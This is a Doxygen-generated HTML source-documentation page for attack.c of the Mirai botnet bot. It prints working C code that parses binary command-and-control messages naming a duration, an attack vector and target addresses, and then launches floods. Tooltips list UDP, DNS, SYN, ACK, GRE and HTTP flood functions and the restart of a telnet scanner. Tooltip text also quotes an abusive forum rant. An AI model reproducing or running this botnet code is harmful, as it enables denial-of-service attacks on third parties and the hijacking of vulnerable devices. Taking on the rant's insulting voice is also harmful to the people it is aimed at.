class="keywordflow">return</span> <a class="code" href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a>;</div><div class="line"><a name="l00042"></a><span class="lineno">   42</span>&#160;}</div><div class="ttc" id="attack_8h_html_a4b75221461ff0dc40c8199b5c2353a81"><div class="ttname"><a href="attack_8h.html#a4b75221461ff0dc40c8199b5c2353a81">attack_app_http</a></div><div class="ttdeci">void attack_app_http(uint8_t, struct attack_target *, uint8_t, struct attack_option *)</div><div class="ttdef"><b>Definition:</b> <a href="attack__app_8c_source.html#l00026">attack_app.c:26</a></div></div>
<div class="ttc" id="attack_8h_html_ad64add15bdc08f30c42b74a7af54c68b"><div class="ttname"><a href="attack_8h.html#ad64add15bdc08f30c42b74a7af54c68b">ATK_VEC_STOMP</a></div><div class="ttdeci">#define ATK_VEC_STOMP</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00039">attack.h:39</a></div></div>
<div class="ttc" id="attack_8h_html_afa9c71242ff3032ca0a9b4f8053a9769"><div class="ttname"><a href="attack_8h.html#afa9c71242ff3032ca0a9b4f8053a9769">ATK_VEC_VSE</a></div><div class="ttdeci">#define ATK_VEC_VSE</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00035">attack.h:35</a></div></div>
<div class="ttc" id="loader_2src_2headers_2includes_8h_html_aa8cecfc5c5c054d2875c03e77b7be15d"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a></div><div class="ttdeci">#define TRUE</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2headers_2includes_8h_source.html#l00010">includes.h:10</a></div></div>
<div class="ttc" id="attack_8h_html_a56a3bedfd2e2500ecdaff5edc2bcbc18"><div class="ttname"><a href="attack_8h.html#a56a3bedfd2e2500ecdaff5edc2bcbc18">attack_tcp_ack</a></div><div class="ttdeci">void attack_tcp_ack(uint8_t, struct attack_target *, uint8_t, struct attack_option *)</div><div class="ttdef"><b>Definition:</b> <a href="attack__tcp_8c_source.html#l00161">attack_tcp.c:161</a></div></div>
<div class="ttc" id="attack_8c_html_a22dc581aab1aa201c76bf9bbb82affdf"><div class="ttname"><a href="attack_8c.html#a22dc581aab1aa201c76bf9bbb82affdf">add_attack</a></div><div class="ttdeci">static void add_attack(ATTACK_VECTOR vector, ATTACK_FUNC func)</div><div class="ttdef"><b>Definition:</b> <a href="attack_8c_source.html#l00226">attack.c:226</a></div></div>
<div class="ttc" id="attack_8h_html_a793fdfa64aaad657551cc649e2988a81"><div class="ttname"><a href="attack_8h.html#a793fdfa64aaad657551cc649e2988a81">attack_udp_generic</a></div><div class="ttdeci">void attack_udp_generic(uint8_t, struct attack_target *, uint8_t, struct attack_option *)</div><div class="ttdef"><b>Definition:</b> <a href="attack__udp_8c_source.html#l00025">attack_udp.c:25</a></div></div>
<div class="ttc" id="attack_8h_html_a12573f0d31b49ed03a25a6bee68cd37f"><div class="ttname"><a href="attack_8h.html#a12573f0d31b49ed03a25a6bee68cd37f">attack_udp_vse</a></div><div class="ttdeci">void attack_udp_vse(uint8_t, struct attack_target *, uint8_t, struct attack_option *)</div><div class="ttdef"><b>Definition:</b> <a href="attack__udp_8c_source.html#l00129">attack_udp.c:129</a></div></div>
<div class="ttc" id="attack_8h_html_af036d9269a58359f703ac0b2cece2187"><div class="ttname"><a href="attack_8h.html#af036d9269a58359f703ac0b2cece2187">ATK_VEC_GREETH</a></div><div class="ttdeci">#define ATK_VEC_GREETH</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00041">attack.h:41</a></div></div>
<div class="ttc" id="attack_8h_html_acffffc5cd4b1d6c59581a487a63edc07"><div class="ttname"><a href="attack_8h.html#acffffc5cd4b1d6c59581a487a63edc07">attack_gre_eth</a></div><div class="ttdeci">void attack_gre_eth(uint8_t, struct attack_target *, uint8_t, struct attack_option *)</div><div class="ttdef"><b>Definition:</b> <a href="attack__gre_8c_source.html#l00162">attack_gre.c:162</a></div></div>
<div class="ttc" id="attack_8h_html_aff68f7c623b860ed728b0343b955e1a4"><div class="ttname"><a href="attack_8h.html#aff68f7c623b860ed728b0343b955e1a4">attack_tcp_stomp</a></div><div class="ttdeci">void attack_tcp_stomp(uint8_t, struct attack_target *, uint8_t, struct attack_option *)</div><div class="ttdef"><b>Definition:</b> <a href="attack__tcp_8c_source.html#l00293">attack_tcp.c:293</a></div></div>
<div class="ttc" id="attack_8h_html_acfffd96bfc135495f6d2dcf0b5c0345c"><div class="ttname"><a href="attack_8h.html#acfffd96bfc135495f6d2dcf0b5c0345c">ATK_VEC_DNS</a></div><div class="ttdeci">#define ATK_VEC_DNS</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00036">attack.h:36</a></div></div>
<div class="ttc" id="attack_8h_html_a5d6a088c0ce3645498a4870ccfd09a3c"><div class="ttname"><a href="attack_8h.html#a5d6a088c0ce3645498a4870ccfd09a3c">ATK_VEC_ACK</a></div><div class="ttdeci">#define ATK_VEC_ACK</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00038">attack.h:38</a></div></div>
<div class="ttc" id="attack_8h_html_a5eb6c3d025947541be2af2b80b9b655a"><div class="ttname"><a href="attack_8h.html#a5eb6c3d025947541be2af2b80b9b655a">ATTACK_FUNC</a></div><div class="ttdeci">void(* ATTACK_FUNC)(uint8_t, struct attack_target *, uint8_t, struct attack_option *)</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00031">attack.h:31</a></div></div>
<div class="ttc" id="attack_8h_html_ad80bc552383b0999af6fa38e1718419c"><div class="ttname"><a href="attack_8h.html#ad80bc552383b0999af6fa38e1718419c">ATK_VEC_SYN</a></div><div class="ttdeci">#define ATK_VEC_SYN</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00037">attack.h:37</a></div></div>
<div class="ttc" id="attack_8h_html_af64bc1071be075031eb42fc6635fd5fa"><div class="ttname"><a href="attack_8h.html#af64bc1071be075031eb42fc6635fd5fa">attack_gre_ip</a></div><div class="ttdeci">void attack_gre_ip(uint8_t, struct attack_target *, uint8_t, struct attack_option *)</div><div class="ttdef"><b>Definition:</b> <a href="attack__gre_8c_source.html#l00020">attack_gre.c:20</a></div></div>
<div class="ttc" id="attack_8h_html_ae0f309784c914a61d84fd3988e3e7321"><div class="ttname"><a href="attack_8h.html#ae0f309784c914a61d84fd3988e3e7321">ATK_VEC_UDP</a></div><div class="ttdeci">#define ATK_VEC_UDP</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00034">attack.h:34</a></div></div>
<div class="ttc" id="attack_8h_html_aa6e206675e668d9ef1a931bdac2cb42e"><div class="ttname"><a href="attack_8h.html#aa6e206675e668d9ef1a931bdac2cb42e">attack_udp_dns</a></div><div class="ttdeci">void attack_udp_dns(uint8_t, struct attack_target *, uint8_t, struct attack_option *)</div><div class="ttdef"><b>Definition:</b> <a href="attack__udp_8c_source.html#l00230">attack_udp.c:230</a></div></div>
<div class="ttc" id="attack_8h_html_a4f522d5241fa0355196c03eaa610c90f"><div class="ttname"><a href="attack_8h.html#a4f522d5241fa0355196c03eaa610c90f">ATK_VEC_UDP_PLAIN</a></div><div class="ttdeci">#define ATK_VEC_UDP_PLAIN</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00043">attack.h:43</a></div></div>
<div class="ttc" id="attack_8h_html_a3ac5365a0319b66a7a029342542156b6"><div class="ttname"><a href="attack_8h.html#a3ac5365a0319b66a7a029342542156b6">ATK_VEC_GREIP</a></div><div class="ttdeci">#define ATK_VEC_GREIP</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00040">attack.h:40</a></div></div>
<div class="ttc" id="attack_8h_html_a8ced07abb18975692f26b538247550db"><div class="ttname"><a href="attack_8h.html#a8ced07abb18975692f26b538247550db">ATK_VEC_HTTP</a></div><div class="ttdeci">#define ATK_VEC_HTTP</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00044">attack.h:44</a></div></div>
<div class="ttc" id="attack_8h_html_a02ff8d6a614d729c46bae7cd348e511e"><div class="ttname"><a href="attack_8h.html#a02ff8d6a614d729c46bae7cd348e511e">attack_udp_plain</a></div><div class="ttdeci">void attack_udp_plain(uint8_t, struct attack_target *, uint8_t, struct attack_option *)</div><div class="ttdef"><b>Definition:</b> <a href="attack__udp_8c_source.html#l00375">attack_udp.c:375</a></div></div>
<div class="ttc" id="attack_8h_html_a5fa5ce92d7cd276d0cf13922eddf1e6d"><div class="ttname"><a href="attack_8h.html#a5fa5ce92d7cd276d0cf13922eddf1e6d">attack_tcp_syn</a></div><div class="ttdeci">void attack_tcp_syn(uint8_t, struct attack_target *, uint8_t, struct attack_option *)</div><div class="ttdef"><b>Definition:</b> <a href="attack__tcp_8c_source.html#l00018">attack_tcp.c:18</a></div></div>
</div><!-- fragment -->
</div>
</div>
<a class="anchor" id="acf00fa745202d52753ab2b2b9b7b1e09"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">void attack_kill_all </td>
          <td>(</td>
          <td class="paramtype">void&#160;</td>
          <td class="paramname"></td><td>)</td>
          <td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8c_source.html#l00044">44</a> of file <a class="el" href="attack_8c_source.html">attack.c</a>.</p>

<p>References <a class="el" href="attack_8h_source.html#l00012">ATTACK_CONCURRENT_MAX</a>, <a class="el" href="attack_8c_source.html#l00020">attack_ongoing</a>, and <a class="el" href="scanner_8h.html#aec54f69564fbbbac5032deae9361438a">scanner_init()</a>.</p>

<p>Referenced by <a class="el" href="mirai_2bot_2main_8c_source.html#l00047">main()</a>.</p>
<div class="fragment"><div class="line"><a name="l00045"></a><span class="lineno">   45</span>&#160;{</div><div class="line"><a name="l00046"></a><span class="lineno">   46</span>&#160;    <span class="keywordtype">int</span> i;</div><div class="line"><a name="l00047"></a><span class="lineno">   47</span>&#160;</div><div class="line"><a name="l00048"></a><span class="lineno">   48</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00049"></a><span class="lineno">   49</span>&#160;    printf(<span class="stringliteral">&quot;[attack] Killing all ongoing attacks\n&quot;</span>);</div><div class="line"><a name="l00050"></a><span class="lineno">   50</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00051"></a><span class="lineno">   51</span>&#160;</div><div class="line"><a name="l00052"></a><span class="lineno">   52</span>&#160;    <span class="keywordflow">for</span> (i = 0; i &lt; <a class="code" href="attack_8h.html#a7c4eacf15bd06764a0834171b5d6789f">ATTACK_CONCURRENT_MAX</a>; i++)</div><div class="line"><a name="l00053"></a><span class="lineno">   53</span>&#160;    {</div><div class="line"><a name="l00054"></a><span class="lineno">   54</span>&#160;        <span class="keywordflow">if</span> (<a class="code" href="attack_8c.html#a46485849828585ce0cad92273523730c">attack_ongoing</a>[i] != 0)</div><div class="line"><a name="l00055"></a><span class="lineno">   55</span>&#160;            kill(<a class="code" href="attack_8c.html#a46485849828585ce0cad92273523730c">attack_ongoing</a>[i], 9);</div><div class="line"><a name="l00056"></a><span class="lineno">   56</span>&#160;        <a class="code" href="attack_8c.html#a46485849828585ce0cad92273523730c">attack_ongoing</a>[i] = 0;</div><div class="line"><a name="l00057"></a><span class="lineno">   57</span>&#160;    }</div><div class="line"><a name="l00058"></a><span class="lineno">   58</span>&#160;</div><div class="line"><a name="l00059"></a><span class="lineno">   59</span>&#160;<span class="preprocessor">#ifdef MIRAI_TELNET</span></div><div class="line"><a name="l00060"></a><span class="lineno">   60</span>&#160;    <a class="code" href="scanner_8h.html#aec54f69564fbbbac5032deae9361438a">scanner_init</a>();</div><div class="line"><a name="l00061"></a><span class="lineno">   61</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00062"></a><span class="lineno">   62</span>&#160;}</div><div class="ttc" id="scanner_8h_html_aec54f69564fbbbac5032deae9361438a"><div class="ttname"><a href="scanner_8h.html#aec54f69564fbbbac5032deae9361438a">scanner_init</a></div><div class="ttdeci">void scanner_init()</div></div>
<div class="ttc" id="attack_8c_html_a46485849828585ce0cad92273523730c"><div class="ttname"><a href="attack_8c.html#a46485849828585ce0cad92273523730c">attack_ongoing</a></div><div class="ttdeci">int attack_ongoing[ATTACK_CONCURRENT_MAX]</div><div class="ttdef"><b>Definition:</b> <a href="attack_8c_source.html#l00020">attack.c:20</a></div></div>
<div class="ttc" id="attack_8h_html_a7c4eacf15bd06764a0834171b5d6789f"><div class="ttname"><a href="attack_8h.html#a7c4eacf15bd06764a0834171b5d6789f">ATTACK_CONCURRENT_MAX</a></div><div class="ttdeci">#define ATTACK_CONCURRENT_MAX</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00012">attack.h:12</a></div></div>
</div><!-- fragment -->
</div>
</div>
<a class="anchor" id="aaa329d2cc3ef50d00c6cd7a6fb5ba012"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">void attack_parse </td>
          <td>(</td>
          <td class="paramtype">char *&#160;</td>
          <td class="paramname">, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">int&#160;</td>
          <td class="paramname">&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8c_source.html#l00064">64</a> of file <a class="el" href="attack_8c_source.html">attack.c</a>.</p>

<p>References <a class="el" href="attack_8h_source.html#l00022">attack_target::addr</a>, <a class="el" href="attack_8c_source.html#l00155">attack_start()</a>, <a class="el" href="ForumPost_8txt_source.html#l00030">free</a>, <a class="el" href="attack_8c_source.html#l00237">free_opts()</a>, <a class="el" href="attack_8h_source.html#l00028">attack_option::key</a>, <a class="el" href="attack_8h_source.html#l00023">attack_target::netmask</a>, <a class="el" href="attack_8h_source.html#l00021">attack_target::sock_addr</a>, <a class="el" href="mirai_2bot_2util_8c_source.html#l00072">util_memcpy()</a>, <a class="el" href="attack_8h_source.html#l00027">attack_option::val</a>, and <a class="el" href="attack_8h_source.html#l00075">attack_method::vector</a>.</p>

<p>Referenced by <a class="el" href="mirai_2bot_2main_8c_source.html#l00047">main()</a>.</p>
<div class="fragment"><div class="line"><a name="l00065"></a><span class="lineno">   65</span>&#160;{</div><div class="line"><a name="l00066"></a><span class="lineno">   66</span>&#160;    <span class="keywordtype">int</span> i;</div><div class="line"><a name="l00067"></a><span class="lineno">   67</span>&#160;    uint32_t duration;</div><div class="line"><a name="l00068"></a><span class="lineno">   68</span>&#160;    <a class="code" href="attack_8h.html#a0fb3d519486301242753dc8e7f175683">ATTACK_VECTOR</a> vector;</div><div class="line"><a name="l00069"></a><span class="lineno">   69</span>&#160;    uint8_t targs_len, opts_len;</div><div class="line"><a name="l00070"></a><span class="lineno">   70</span>&#160;    <span class="keyword">struct </span><a class="code" href="structattack__target.html">attack_target</a> *targs = NULL;</div><div class="line"><a name="l00071"></a><span class="lineno">   71</span>&#160;    <span class="keyword">struct </span><a class="code" href="structattack__option.html">attack_option</a> *opts = NULL;</div><div class="line"><a name="l00072"></a><span class="lineno">   72</span>&#160;</div><div class="line"><a name="l00073"></a><span class="lineno">   73</span>&#160;    <span class="comment">// Read in attack duration uint32_t</span></div><div class="line"><a name="l00074"></a><span class="lineno">   74</span>&#160;    <span class="keywordflow">if</span> (len &lt; <span class="keyword">sizeof</span> (uint32_t))</div><div class="line"><a name="l00075"></a><span class="lineno">   75</span>&#160;        <span class="keywordflow">goto</span> cleanup;</div><div class="line"><a name="l00076"></a><span class="lineno">   76</span>&#160;    duration = ntohl(*((uint32_t *)buf));</div><div class="line"><a name="l00077"></a><span class="lineno">   77</span>&#160;    buf += <span class="keyword">sizeof</span> (uint32_t);</div><div class="line"><a name="l00078"></a><span class="lineno">   78</span>&#160;    len -= <span class="keyword">sizeof</span> (uint32_t);</div><div class="line"><a name="l00079"></a><span class="lineno">   79</span>&#160;</div><div class="line"><a name="l00080"></a><span class="lineno">   80</span>&#160;    <span class="comment">// Read in attack ID uint8_t</span></div><div class="line"><a name="l00081"></a><span class="lineno">   81</span>&#160;    <span class="keywordflow">if</span> (len == 0)</div><div class="line"><a name="l00082"></a><span class="lineno">   82</span>&#160;        <span class="keywordflow">goto</span> cleanup;</div><div class="line"><a name="l00083"></a><span class="lineno">   83</span>&#160;    vector = (<a class="code" href="attack_8h.html#a0fb3d519486301242753dc8e7f175683">ATTACK_VECTOR</a>)*buf++;</div><div class="line"><a name="l00084"></a><span class="lineno">   84</span>&#160;    len -= <span class="keyword">sizeof</span> (uint8_t);</div><div class="line"><a name="l00085"></a><span class="lineno">   85</span>&#160;</div><div class="line"><a name="l00086"></a><span class="lineno">   86</span>&#160;    <span class="comment">// Read in target count uint8_t</span></div><div class="line"><a name="l00087"></a><span class="lineno">   87</span>&#160;    <span class="keywordflow">if</span> (len == 0)</div><div class="line"><a name="l00088"></a><span class="lineno">   88</span>&#160;        <span class="keywordflow">goto</span> cleanup;</div><div class="line"><a name="l00089"></a><span class="lineno">   89</span>&#160;    targs_len = (uint8_t)*buf++;</div><div class="line"><a name="l00090"></a><span class="lineno">   90</span>&#160;    len -= <span class="keyword">sizeof</span> (uint8_t);</div><div class="line"><a name="l00091"></a><span class="lineno">   91</span>&#160;    <span class="keywordflow">if</span> (targs_len == 0)</div><div class="line"><a name="l00092"></a><span class="lineno">   92</span>&#160;        <span class="keywordflow">goto</span> cleanup;</div><div class="line"><a name="l00093"></a><span class="lineno">   93</span>&#160;</div><div class="line"><a name="l00094"></a><span class="lineno">   94</span>&#160;    <span class="comment">// Read in all targs</span></div><div class="line"><a name="l00095"></a><span class="lineno">   95</span>&#160;    <span class="keywordflow">if</span> (len &lt; ((<span class="keyword">sizeof</span> (<a class="code" href="loader_2src_2headers_2includes_8h.html#aaadf2e480fd246ff9e932039b223baed">ipv4_t</a>) + <span class="keyword">sizeof</span> (uint8_t)) * targs_len))</div><div class="line"><a name="l00096"></a><span class="lineno">   96</span>&#160;        <span class="keywordflow">goto</span> cleanup;</div><div class="line"><a name="l00097"></a><span class="lineno">   97</span>&#160;    targs = calloc(targs_len, <span class="keyword">sizeof</span> (<span class="keyword">struct</span> <a class="code" href="structattack__target.html">attack_target</a>));</div><div class="line"><a name="l00098"></a><span class="lineno">   98</span>&#160;    <span class="keywordflow">for</span> (i = 0; i &lt; targs_len; i++)</div><div class="line"><a name="l00099"></a><span class="lineno">   99</span>&#160;    {</div><div class="line"><a name="l00100"></a><span class="lineno">  100</span>&#160;        targs[i].<a class="code" href="structattack__target.html#a431d4eed6dd4e7faddf9b8615b4d5c2a">addr</a> = *((<a class="code" href="loader_2src_2headers_2includes_8h.html#aaadf2e480fd246ff9e932039b223baed">ipv4_t</a> *)buf);</div><div class="line"><a name="l00101"></a><span class="lineno">  101</span>&#160;        buf += <span class="keyword">sizeof</span> (<a class="code" href="loader_2src_2headers_2includes_8h.html#aaadf2e480fd246ff9e932039b223baed">ipv4_t</a>);</div><div class="line"><a name="l00102"></a><span class="lineno">  102</span>&#160;        targs[i].<a class="code" href="structattack__target.html#af38e9712f03de6be723c5acede3f2114">netmask</a> = (uint8_t)*buf++;</div><div class="line"><a name="l00103"></a><span class="lineno">  103</span>&#160;        len -= (<span class="keyword">sizeof</span> (<a class="code" href="loader_2src_2headers_2includes_8h.html#aaadf2e480fd246ff9e932039b223baed">ipv4_t</a>) + <span class="keyword">sizeof</span> (uint8_t));</div><div class="line"><a name="l00104"></a><span class="lineno">  104</span>&#160;</div><div class="line"><a name="l00105"></a><span class="lineno">  105</span>&#160;        targs[i].<a class="code" href="structattack__target.html#a8f537c8c1aa7f2b611c6de392d964dfc">sock_addr</a>.sin_family = AF_INET;</div><div class="line"><a name="l00106"></a><span class="lineno">  106</span>&#160;        targs[i].<a class="code" href="structattack__target.html#a8f537c8c1aa7f2b611c6de392d964dfc">sock_addr</a>.sin_addr.s_addr = targs[i].<a class="code" href="structattack__target.html#a431d4eed6dd4e7faddf9b8615b4d5c2a">addr</a>;</div><div class="line"><a name="l00107"></a><span class="lineno">  107</span>&#160;    }</div><div class="line"><a name="l00108"></a><span class="lineno">  108</span>&#160;</div><div class="line"><a name="l00109"></a><span class="lineno">  109</span>&#160;    <span class="comment">// Read in flag count uint8_t</span></div><div class="line"><a name="l00110"></a><span class="lineno">  110</span>&#160;    <span class="keywordflow">if</span> (len &lt; <span class="keyword">sizeof</span> (uint8_t))</div><div class="line"><a name="l00111"></a><span class="lineno">  111</span>&#160;        <span class="keywordflow">goto</span> cleanup;</div><div class="line"><a name="l00112"></a><span class="lineno">  112</span>&#160;    opts_len = (uint8_t)*buf++;</div><div class="line"><a name="l00113"></a><span class="lineno">  113</span>&#160;    len -= <span class="keyword">sizeof</span> (uint8_t);</div><div class="line"><a name="l00114"></a><span class="lineno">  114</span>&#160;</div><div class="line"><a name="l00115"></a><span class="lineno">  115</span>&#160;    <span class="comment">// Read in all opts</span></div><div class="line"><a name="l00116"></a><span class="lineno">  116</span>&#160;    <span class="keywordflow">if</span> (opts_len &gt; 0)</div><div class="line"><a name="l00117"></a><span class="lineno">  117</span>&#160;    {</div><div class="line"><a name="l00118"></a><span class="lineno">  118</span>&#160;        opts = calloc(opts_len, <span class="keyword">sizeof</span> (<span class="keyword">struct</span> <a class="code" href="structattack__option.html">attack_option</a>));</div><div class="line"><a name="l00119"></a><span class="lineno">  119</span>&#160;        <span class="keywordflow">for</span> (i = 0; i &lt; opts_len; i++)</div><div class="line"><a name="l00120"></a><span class="lineno">  120</span>&#160;        {</div><div class="line"><a name="l00121"></a><span class="lineno">  121</span>&#160;            uint8_t val_len;</div><div class="line"><a name="l00122"></a><span class="lineno">  122</span>&#160;</div><div class="line"><a name="l00123"></a><span class="lineno">  123</span>&#160;            <span class="comment">// Read in key uint8</span></div><div class="line"><a name="l00124"></a><span class="lineno">  124</span>&#160;            <span class="keywordflow">if</span> (len &lt; <span class="keyword">sizeof</span> (uint8_t))</div><div class="line"><a name="l00125"></a><span class="lineno">  125</span>&#160;                <span class="keywordflow">goto</span> cleanup;</div><div class="line"><a name="l00126"></a><span class="lineno">  126</span>&#160;            opts[i].<a class="code" href="structattack__option.html#a276df7d1c5fbbf555b8430a39b4015df">key</a> = (uint8_t)*buf++;</div><div class="line"><a name="l00127"></a><span class="lineno">  127</span>&#160;            len -= <span class="keyword">sizeof</span> (uint8_t);</div><div class="line"><a name="l00128"></a><span class="lineno">  128</span>&#160;</div><div class="line"><a name="l00129"></a><span class="lineno">  129</span>&#160;            <span class="comment">// Read in data length uint8</span></div><div class="line"><a name="l00130"></a><span class="lineno">  130</span>&#160;            <span class="keywordflow">if</span> (len &lt; <span class="keyword">sizeof</span> (uint8_t))</div><div class="line"><a name="l00131"></a><span class="lineno">  131</span>&#160;                <span class="keywordflow">goto</span> cleanup;</div><div class="line"><a name="l00132"></a><span class="lineno">  132</span>&#160;            val_len = (uint8_t)*buf++;</div><div class="line"><a name="l00133"></a><span class="lineno">  133</span>&#160;            len -= <span class="keyword">sizeof</span> (uint8_t);</div><div class="line"><a name="l00134"></a><span class="lineno">  134</span>&#160;</div><div class="line"><a name="l00135"></a><span class="lineno">  135</span>&#160;            <span class="keywordflow">if</span> (len &lt; val_len)</div><div class="line"><a name="l00136"></a><span class="lineno">  136</span>&#160;                <span class="keywordflow">goto</span> cleanup;</div><div class="line"><a name="l00137"></a><span class="lineno">  137</span>&#160;            opts[i].<a class="code" href="structattack__option.html#ab0978cf1e5a662ff83e73356b422d837">val</a> = calloc(val_len + 1, <span class="keyword">sizeof</span> (<span class="keywordtype">char</span>));</div><div class="line"><a name="l00138"></a><span class="lineno">  138</span>&#160;            <a class="code" href="mirai_2bot_2util_8c.html#a8654e276185a2f53935614d38f4117f3">util_memcpy</a>(opts[i].<a class="code" href="structattack__option.html#ab0978cf1e5a662ff83e73356b422d837">val</a>, buf, val_len);</div><div class="line"><a name="l00139"></a><span class="lineno">  139</span>&#160;            buf += val_len;</div><div class="line"><a name="l00140"></a><span class="lineno">  140</span>&#160;            len -= val_len;</div><div class="line"><a name="l00141"></a><span class="lineno">  141</span>&#160;        }</div><div class="line"><a name="l00142"></a><span class="lineno">  142</span>&#160;    }</div><div class="line"><a name="l00143"></a><span class="lineno">  143</span>&#160;</div><div class="line"><a name="l00144"></a><span class="lineno">  144</span>&#160;    errno = 0;</div><div class="line"><a name="l00145"></a><span class="lineno">  145</span>&#160;    <a class="code" href="attack_8c.html#a5631e1ae5b2170dabea1d03c816e9885">attack_start</a>(duration, vector, targs_len, targs, opts_len, opts);</div><div class="line"><a name="l00146"></a><span class="lineno">  146</span>&#160;</div><div class="line"><a name="l00147"></a><span class="lineno">  147</span>&#160;    <span class="comment">// Cleanup</span></div><div class="line"><a name="l00148"></a><span class="lineno">  148</span>&#160;    cleanup:</div><div class="line"><a name="l00149"></a><span class="lineno">  149</span>&#160;    <span class="keywordflow">if</span> (targs != NULL)</div><div class="line"><a name="l00150"></a><span class="lineno">  150</span>&#160;        <a class="code" href="ForumPost_8txt.html#ab292715cb198b54d1912ed6209d567dc">free</a>(targs);</div><div class="line"><a name="l00151"></a><span class="lineno">  151</span>&#160;    <span class="keywordflow">if</span> (opts != NULL)</div><div class="line"><a name="l00152"></a><span class="lineno">  152</span>&#160;        <a class="code" href="attack_8c.html#a540818eda3ba12636511e0ef58c4630b">free_opts</a>(opts, opts_len);</div><div class="line"><a name="l00153"></a><span class="lineno">  153</span>&#160;}</div><div class="ttc" id="structattack__target_html_a431d4eed6dd4e7faddf9b8615b4d5c2a"><div class="ttname"><a href="structattack__target.html#a431d4eed6dd4e7faddf9b8615b4d5c2a">attack_target::addr</a></div><div class="ttdeci">ipv4_t addr</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00022">attack.h:22</a></div></div>
<div class="ttc" id="structattack__option_html"><div class="ttname"><a href="structattack__option.html">attack_option</a></div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00026">attack.h:26</a></div></div>
<div class="ttc" id="loader_2src_2headers_2includes_8h_html_aaadf2e480fd246ff9e932039b223baed"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html#aaadf2e480fd246ff9e932039b223baed">ipv4_t</a></div><div class="ttdeci">uint32_t ipv4_t</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2headers_2includes_8h_source.html#l00013">includes.h:13</a></div></div>
<div class="ttc" id="structattack__option_html_a276df7d1c5fbbf555b8430a39b4015df"><div class="ttname"><a href="structattack__option.html#a276df7d1c5fbbf555b8430a39b4015df">attack_option::key</a></div><div class="ttdeci">uint8_t key</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00028">attack.h:28</a></div></div>
<div class="ttc" id="ForumPost_8txt_html_ab292715cb198b54d1912ed6209d567dc"><div class="ttname"><a href="ForumPost_8txt.html#ab292715cb198b54d1912ed6209d567dc">free</a></div><div class="ttdeci">try harder skiddo Your skeleton tool sucks it thought the attack decoder was sinden but it does not even use a text based protocol CNC and bot communicate over binary protocol you say some others kill based on cwd It shows how out of the loop you are with real malware Go back to skidland slaps for you Why are you writing reverse engineer tools You cannot even correctly reverse in the first place Please learn some skills first before trying to impress others Your arrogance in declaring how you beat me with your dumb kung fu statement made me laugh so hard while eating my SO had to pat me on the back Just as I forever be free</div><div class="ttdef"><b>Definition:</b> <a href="ForumPost_8txt_source.html#l00030">ForumPost.txt:30</a></div></div>
<div class="ttc" id="attack_8h_html_a0fb3d519486301242753dc8e7f175683"><div class="ttname"><a href="attack_8h.html#a0fb3d519486301242753dc8e7f175683">ATTACK_VECTOR</a></div><div class="ttdeci">uint8_t ATTACK_VECTOR</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00032">attack.h:32</a></div></div>
<div class="ttc" id="structattack__option_html_ab0978cf1e5a662ff83e73356b422d837"><div class="ttname"><a href="structattack__option.html#ab0978cf1e5a662ff83e73356b422d837">attack_option::val</a></div><div class="ttdeci">char * val</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00027">attack.h:27</a></div></div>
<div class="ttc" id="mirai_2bot_2util_8c_html_a8654e276185a2f53935614d38f4117f3"><div class="ttname"><a href="mirai_2bot_2util_8c.html#a8654e276185a2f53935614d38f4117f3">util_memcpy</a></div><div class="ttdeci">void util_memcpy(void *dst, void *src, int len)</div><div class="ttdef"><b>Definition:</b> <a href="mirai_2bot_2util_8c_source.html#l00072">util.c:72</a></div></div>
<div class="ttc" id="structattack__target_html_af38e9712f03de6be723c5acede3f2114"><div class="ttname"><a href="structattack__target.html#af38e9712f03de6be723c5acede3f2114">attack_target::netmask</a></div><div class="ttdeci">uint8_t netmask</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00023">attack.h:23</a></div></div>
<div class="ttc" id="structattack__target_html_a8f537c8c1aa7f2b611c6de392d964dfc"><div class="ttname"><a href="structattack__target.html#a8f537c8c1aa7f2b611c6de392d964dfc">attack_target::sock_addr</a></div><div class="ttdeci">struct sockaddr_in sock_addr</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00021">attack.h:21</a></div></div>
